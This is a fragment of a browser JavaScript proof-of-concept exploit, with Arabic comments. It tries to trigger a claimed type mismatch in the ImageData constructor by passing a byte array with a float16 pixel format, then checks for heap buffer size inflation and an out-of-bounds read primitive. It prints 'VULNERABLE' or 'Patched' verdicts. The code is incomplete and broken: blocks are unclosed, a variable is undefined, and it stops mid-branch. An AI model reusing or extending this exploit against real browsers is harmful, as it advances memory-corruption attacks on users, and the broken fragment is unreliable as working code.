        function log(msg, isError = false) {
            const out = document.getElementById('output');
            out.innerHTML += `<span class="${isError ? 'error' : ''}">[+] ${msg}</span>\n`;

        function runExploitPoC() {

                // إنشاء مصفوفة بايت صغيرة سيتم التلاعب بحجمها أو قراءتها بتنسيق خاطئ
                const targetArray = new Uint8ClampedArray(16);
                targetArray[0] = 0x41;
                targetArray[1] = 0x42;
                targetArray[2] = 0x43;
                targetArray[3] = 0x44;

                log("Triggering ImageData type mismatch constructor flaw...");

                // مما يؤدي إلى تخصيص حسابي خاطئ لحجم البفر في الـ Heap.
                let corruptedImageData;
                try {
                    corruptedImageData = new ImageData(targetArray, 2, 1, {
                        colorSpace: "srgb",
                        pixelFormat: "rgba-float16"
                    });
                    log("SUCCESS: ImageData created with mismatched pixel format! Browser is VULNERABLE.", true);
                } catch (err) {
                    status.innerText = "Status: Patched (Exception caught)";
                    log("Failed to create mismatched ImageData. Error: " + err.message);
                    return;
                }

                log("Attempting OOB Read / Type Confusion primitive via corrupted ImageData.data...");
                const dataView = corruptedImageData.data;
                
                // فحص طول البيانات الفعلي مقارنة بالمصفوفة الأصلية لاكتشاف تضارب الـ Heap
                log(`Original Array Length: ${targetArray.length}`);
                log(`Corrupted ImageData Data Length: ${dataView.length}`);

                if (dataView.length !== targetArray.length) {
                    log("CRITICAL: Heap buffer size mismatch verified! Size inflation achieved.", true);
                    status.innerText = "Status: VULNERABLE - OOB Primitive Possible!";
                } else {
                    log("Buffers match in size, attempting direct memory overlap scan...");
